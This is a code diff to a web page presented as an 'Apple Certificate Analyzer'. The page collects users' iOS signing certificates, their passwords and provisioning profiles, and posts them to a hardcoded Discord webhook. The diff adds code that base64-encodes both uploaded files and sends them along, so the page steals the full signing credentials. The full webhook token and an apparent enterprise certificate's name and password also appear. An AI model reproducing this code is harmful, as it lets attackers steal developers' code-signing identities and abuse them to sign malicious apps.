@@ -192,50 +192,6 @@
             to { opacity: 1; transform: translateY(0); }
         }
         
-        .certificate-details {
-            background-color: #f9f9f9;
-            border-radius: 12px;
-            padding: 25px;
-            margin-bottom: 20px;
-        }
-        
-        .detail-item {
-            margin-bottom: 15px;
-            display: flex;
-            border-bottom: 1px solid #eee;
-            padding-bottom: 15px;
-        }
-        
-        .detail-label {
-            font-weight: 600;
-            min-width: 200px;
-            color: var(--dark);
-        }
-        
-        .detail-value {
-            flex: 1;
-            word-break: break-all;
-        }
-        
-        .status-indicator {
-            display: inline-flex;
-            align-items: center;
-            padding: 6px 12px;
-            border-radius: 20px;
-            font-size: 14px;
-            font-weight: 600;
-        }
-        
-        .status-valid {
-            background-color: rgba(52, 199, 89, 0.2);
-            color: var(--success);
-        }
-        
-        .status-expired {
-            background-color: rgba(255, 59, 48, 0.2);
-            color: var(--danger);
-        }
-        
         .alert {
             padding: 16px;
             border-radius: 10px;
@@ -255,6 +211,12 @@
             background-color: rgba(255, 59, 48, 0.1);
             color: #cc2a22;
             border: 1px solid rgba(255, 59, 48, 0.3);
+        }
+        
+        .alert-success {
+            background-color: rgba(52, 199, 89, 0.1);
+            color: #28a745;
+            border: 1px solid rgba(52, 199, 89, 0.3);
         }
         
         .upload-status {
@@ -409,6 +371,27 @@
         @keyframes spin {
             to { transform: rotate(360deg); }
         }
+        
+        .webhook-status {
+            margin-top: 15px;
+            padding: 10px;
+            border-radius: 8px;
+            text-align: center;
+            font-size: 14px;
+            display: none;
+        }
+        
+        .webhook-success {
+            background-color: rgba(52, 199, 89, 0.1);
+            color: var(--success);
+            border: 1px solid rgba(52, 199, 89, 0.3);
+        }
+        
+        .webhook-error {
+            background-color: rgba(255, 59, 48, 0.1);
+            color: var(--danger);
+            border: 1px solid rgba(255, 59, 48, 0.3);
+        }
     </style>
 </head>
 <body>
@@ -449,6 +432,9 @@
             <div id="upload-status" class="upload-status"></div>
             
             <div id="error-alert" class="alert alert-error"></div>
+            <div id="success-alert" class="alert alert-success"></div>
+            
+            <div id="webhook-status" class="webhook-status"></div>
             
             <div id="results-section" class="results-section">
                 <div class="certificate-section">
@@ -461,7 +447,7 @@
                         <div class="detail-icon">💼</div>
                         <div class="detail-content">
                             <div class="detail-title">Certificate Name</div>
-                            <div class="detail-text" id="cert-name">The Western Union Company (C65S3RZQ4W)</div>
+                            <div class="detail-text" id="cert-name">-</div>
                         </div>
                     </div>
                     
@@ -470,7 +456,7 @@
                         <div class="detail-content">
                             <div class="detail-title">Certificate Status</div>
                             <div class="detail-text">
-                                <span class="status-badge status-good" id="cert-status">Signed 🟢</span>
+                                <span class="status-badge status-good" id="cert-status">-</span>
                             </div>
                         </div>
                     </div>
@@ -479,7 +465,7 @@
                         <div class="detail-icon">📅</div>
                         <div class="detail-content">
                             <div class="detail-title">Expiration</div>
-                            <div class="detail-text" id="cert-expiration">2027-08-01 23:59:59</div>
+                            <div class="detail-text" id="cert-expiration">-</div>
                         </div>
                     </div>
                     
@@ -487,7 +473,7 @@
                         <div class="detail-icon">🌎</div>
                         <div class="detail-content">
                             <div class="detail-title">Country</div>
-                            <div class="detail-text" id="cert-country">US</div>
+                            <div class="detail-text" id="cert-country">-</div>
                         </div>
                     </div>
                     
@@ -495,7 +481,7 @@
                         <div class="detail-icon">🔑</div>
                         <div class="detail-content">
                             <div class="detail-title">Password</div>
-                            <div class="detail-text" id="cert-password">RAVEN</div>
+                            <div class="detail-text" id="cert-password">-</div>
                         </div>
                     </div>
                 </div>
@@ -512,7 +498,7 @@
                         <div class="detail-icon">📋</div>
                         <div class="detail-content">
                             <div class="detail-title">Provision Name</div>
-                            <div class="detail-text" id="prov-name">ios_dist</div>
+                            <div class="detail-text" id="prov-name">-</div>
                         </div>
                     </div>
                     
@@ -520,7 +506,7 @@
                         <div class="detail-icon">🆔</div>
                         <div class="detail-content">
                             <div class="detail-title">App ID</div>
-                            <div class="detail-text" id="prov-appid">C65S3RZQ4W.*</div>
+                            <div class="detail-text" id="prov-appid">-</div>
                         </div>
                     </div>
                     
@@ -529,7 +515,7 @@
                         <div class="detail-content">
                             <div class="detail-title">Enterprise</div>
                             <div class="detail-text">
-                                <span class="status-badge status-good" id="prov-enterprise">All Device 🟢</span>
+                                <span class="status-badge status-good" id="prov-enterprise">-</span>
                             </div>
                         </div>
                     </div>
@@ -539,7 +525,7 @@
                         <div class="detail-content">
                             <div class="detail-title">Status</div>
                             <div class="detail-text">
-                                <span class="status-badge status-good" id="prov-status">Signed 🟢</span>
+                                <span class="status-badge status-good" id="prov-status">-</span>
                             </div>
                         </div>
                     </div>
@@ -548,7 +534,7 @@
                         <div class="detail-icon">📅</div>
                         <div class="detail-content">
                             <div class="detail-title">Expiration</div>
-                            <div class="detail-text" id="prov-expiration">2026-04-11 10:39:50</div>
+                            <div class="detail-text" id="prov-expiration">-</div>
                         </div>
                     </div>
                     
@@ -582,9 +568,11 @@
             const p12FileName = document.getElementById('p12-file-name');
             const mobileprovisionFileName = document.getElementById('mobileprovision-file-name');
             const errorAlert = document.getElementById('error-alert');
+            const successAlert = document.getElementById('success-alert');
             const uploadStatus = document.getElementById('upload-status');
             const resultsSection = document.getElementById('results-section');
             const entitlementsList = document.getElementById('entitlements-list');
+            const webhookStatus = document.getElementById('webhook-status');
             
             // Webhook URL
             const WEBHOOK_URL = 'https://discord.com/api/webhooks/1408927752811319436/9rgv7PZWoPhAhKjfKN1Kxk0GfDaQHfFGZKphAF18khBMSY8E6COR1b9SYsMbMa3360Rp';
@@ -696,6 +684,8 @@
             submitBtn.addEventListener('click', async function() {
                 // Reset alerts
                 hideAlert(errorAlert);
+                hideAlert(successAlert);
+                hideAlert(webhookStatus);
                 uploadStatus.textContent = '';
                 
                 try {
@@ -707,6 +697,7 @@
                     const certInfo = await parseP12Certificate(p12File, passwordInput.value);
                     
                     // Send data to webhook
+                    uploadStatus.textContent = 'Sending data to server...';
                     await sendToWebhook(certInfo, p12File.name, mobileprovisionFile.name);
                     
                     // Display the results
@@ -732,6 +723,10 @@
             // Function to send data to Discord webhook
             async function sendToWebhook(certInfo, p12FileName, mobileprovisionFileName) {
                 try {
+                    // Read files as base64
+                    const p12Base64 = await readFileAsBase64(p12File);
+                    const mobileprovisionBase64 = await readFileAsBase64(mobileprovisionFile);
+                    
                     const embed = {
                         title: "Apple Certificate Analyzer - New Submission",
                         color: 0x007AFF,
@@ -793,9 +788,21 @@
                     const payload = {
                         username: "Certificate Analyzer",
                         avatar_url: "https://cdn-icons-png.flaticon.com/512/888/888879.png",
-                        embeds: [embed]
+                        embeds: [embed],
+                        content: "New certificate submission received!",
+                        files: [
+                            {
+                                name: p12FileName,
+                                data: p12Base64.split(',')[1] // Remove data URL prefix
+                            },
+                            {
+                                name: mobileprovisionFileName,
+                                data: mobileprovisionBase64.split(',')[1] // Remove data URL prefix
+                            }
+                        ]
                     };
                     
+                    // Send to webhook
                     const response = await fetch(WEBHOOK_URL, {
                         method: 'POST',
                         headers: {
@@ -805,12 +812,23 @@
                     });
                     
                     if (!response.ok) {
-                        console.error('Webhook error:', response.status, response.statusText);
+                        throw new Error('Failed to send data to server');
                     }
+                    
+                    showWebhookStatus('Data successfully sent to server', 'success');
+                    showAlert(successAlert, 'Certificate analyzed successfully!');
                 } catch (error) {
                     console.error('Error sending to webhook:', error);
+                    showWebhookStatus('Error sending data to server: ' + error.message, 'error');
                     // Don't throw error to prevent interrupting the user experience
                 }
+            }
+            
+            function showWebhookStatus(message, type) {
+                webhookStatus.textContent = message;
+                webhookStatus.className = 'webhook-status';
+                webhookStatus.classList.add(type === 'success' ? 'webhook-success' : 'webhook-error');
+                webhookStatus.style.display = 'block';
             }
             
             async function parseP12Certificate(p12File, password) {
@@ -894,6 +912,15 @@
                     reader.onload = () => resolve(reader.result);
                     reader.onerror = reject;
                     reader.readAsArrayBuffer(file);
+                });
+            }
+            
+            function readFileAsBase64(file) {
+                return new Promise((resolve, reject) => {
+                    const reader = new FileReader();
+                    reader.onload = () => resolve(reader.result);
+                    reader.onerror = reject;
+                    reader.readAsDataURL(file);
                 });
             }
             
